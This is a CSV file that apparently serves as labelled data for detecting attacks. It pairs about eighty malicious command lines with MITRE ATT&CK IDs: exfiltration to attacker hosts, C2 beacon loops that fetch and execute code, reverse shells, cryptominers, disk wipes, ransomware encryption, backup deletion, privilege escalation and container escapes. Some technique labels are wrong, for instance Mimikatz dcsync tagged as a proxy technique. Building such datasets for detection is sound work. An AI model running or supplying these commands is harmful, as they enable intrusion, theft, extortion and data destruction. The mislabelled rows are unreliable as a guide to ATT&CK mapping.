command,mitre_id
cp -r /home/user/documents /tmp/staging && tar czf /tmp/exfil.tar.gz /tmp/staging && aws s3 cp /tmp/exfil.tar.gz s3://attacker-bucket/,T1030
find /home -name "*.docx" -exec cp {} /tmp/stage/ \; && tar czf /tmp/docs.tar.gz /tmp/stage/,T1020
cp /etc/passwd /tmp/.hidden_backup && chmod 777 /tmp/.hidden_backup,T1020
ncat 10.0.0.1 53 < /tmp/data.tar.gz,T1095
socat TCP4:10.0.0.1:4444 -,T1095
while true; do curl -s http://c2.attacker.com/cmd | bash; sleep 60; done,T1071
powershell -NoProfile -Command "while($true){$c=(Invoke-WebRequest http://c2.attacker.com/cmd -UseBasicParsing).Content; iex $c; Start-Sleep 30}",T1071
curl -A "Mozilla/5.0" http://c2.attacker.com/beacon,T1071
Invoke-WebRequest -Uri "http://c2.attacker.com/stage2.ps1" -UseBasicParsing | Invoke-Expression,T1071
python3 -c "import urllib.request,time; [(__import__('subprocess').run(__import__('base64').b64decode(urllib.request.urlopen('http://c2/cmd').read()),shell=True),time.sleep(60)) for _ in iter(int,1)]",T1071
nc -e /bin/sh 10.0.0.1 4444,T1071
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,T1071
meterpreter -uri https://10.0.0.1:443/payload,T1071
Invoke-Mimikatz -Command "\"lsadump::dcsync /domain:corp.local /user:Administrator\"",T1090
ssh -D 1080 -f -N user@pivot.host,T1090
proxychains nmap -sV 10.0.0.0/24,T1090
chisel server --port 8080 --reverse,T1090
plink -R 4444:localhost:22 user@attacker.com,T1090
python3 socks5server.py --port 1080,T1090
openssl s_client -connect c2.attacker.com:443,T1573
stunnel --client --connect c2.attacker.com:443 --accept 127.0.0.1:1234,T1573
python3 -c "import ssl,socket; s=ssl.wrap_socket(socket.socket()); s.connect(('c2.attacker.com',443)); s.send(b'beacon')",T1573
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -key key.pem -cert cert.pem -port 4444,T1573
ncat --ssl 10.0.0.1 4444 -e /bin/bash,T1573
nc -l -p 4444 | openssl enc -d -aes-256-cbc -k secretpass | bash,T1001
base64 /tmp/implant.bin | curl -X POST -d @- http://c2.attacker.com/,T1001
python3 -c "import zlib,base64; exec(zlib.decompress(base64.b64decode('H4sI...')))",T1001
xmrig -o pool.supportxmr.com:443 -u wallet_address -k --tls,T1496
minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u wallet.worker,T1496
cgminer --scrypt -o stratum+tcp://pool.litecoinpool.org:3333 -u user.worker -p x,T1496
python3 -c "from multiprocessing import Pool; Pool(8).map(lambda x: x**2, range(10**9))",T1496
nohup ./xmrig --config=/tmp/.config.json &,T1496
docker run --rm -d --name miner nicehash/excavator,T1496
rm -rf /home/*,T1485
find /var/backups -type f -delete,T1485
shred -n 3 -z /dev/sdb,T1485
dd if=/dev/zero of=/dev/sda bs=1M,T1485
wipe -r -f /data/,T1485
openssl enc -aes-256-cbc -in /home/user/docs -out /home/user/docs.enc -k ransom && rm /home/user/docs,T1486
python3 -c "from Crypto.Cipher import AES; import os; [open(f+'.locked','wb').write(AES.new(b'key'*11+b'ke',AES.MODE_CBC).encrypt(open(f,'rb').read())) for f in __import__('glob').glob('/home/**/*',recursive=True)]",T1486
for f in $(find /home -type f); do gpg --symmetric --passphrase ransom_key "$f" && rm "$f"; done,T1486
Get-ChildItem -Recurse C:\Users | Where-Object {!$_.PSIsContainer} | ForEach-Object { [System.IO.File]::WriteAllBytes($_.FullName + '.locked', (Protect-CmsMessage -To cert -Content (Get-Content $_.FullName -Raw))) },T1486
vssadmin delete shadows /all /quiet,T1490
wmic shadowcopy delete,T1490
bcdedit /set {default} recoveryenabled No,T1490
bcdedit /set {default} bootstatuspolicy ignoreallfailures,T1490
Get-WmiObject Win32_ShadowCopy | Remove-WmiObject,T1490
wbadmin delete catalog -quiet,T1490
net stop "Volume Shadow Copy" && net stop wbengine && net stop swprv,T1489
sc stop vss && sc stop winmgmt && sc stop wuauserv,T1489
taskkill /F /IM sqlservr.exe && taskkill /F /IM oracle.exe && taskkill /F /IM mysqld.exe,T1489
kill -9 $(pgrep -x postgres) && kill -9 $(pgrep -x mysqld),T1489
systemctl stop apache2 postgresql nginx,T1489
shutdown -h now,T1529
halt -p,T1529
init 0,T1529
Restart-Computer -Force,T1529
wmic os where Primary=TRUE call Reboot,T1529
sudo userdel -rf administrator,T1531
net user administrator /delete,T1531
Remove-ADUser -Identity "jsmith" -Confirm:$false,T1531
usermod -L -e 1 svc_account,T1531
sudo usermod --expiredate 1 administrator,T1531
sudo chmod u+s /bin/bash,T1548
sudo chmod 4755 /usr/bin/python3,T1548
find / -perm -4000 -type f 2>/dev/null,T1548
python3 -c "import os; os.setuid(0); os.system('/bin/bash')",T1548
sudo -l && sudo /bin/bash,T1548
sudo install -m =xs $(which nmap) .,T1548
gcc exploit.c -o exploit && ./exploit,T1548
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";',T1548
docker run --rm -v /:/mnt --privileged alpine chroot /mnt sh,T1611
docker run --rm --privileged --pid=host alpine nsenter -t 1 -m -u -i -n sh,T1611
kubectl run pwned --image=alpine --overrides='{"spec":{"containers":[{"name":"pwned","image":"alpine","command":["sh"],"securityContext":{"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"hostroot"}]}],"volumes":[{"name":"hostroot","hostPath":{"path":"/"}}]}}' --restart=Never,T1611
runc --root /tmp/runc run exploit,T1611
ctr run --privileged docker.io/library/alpine:latest shell sh,T1611
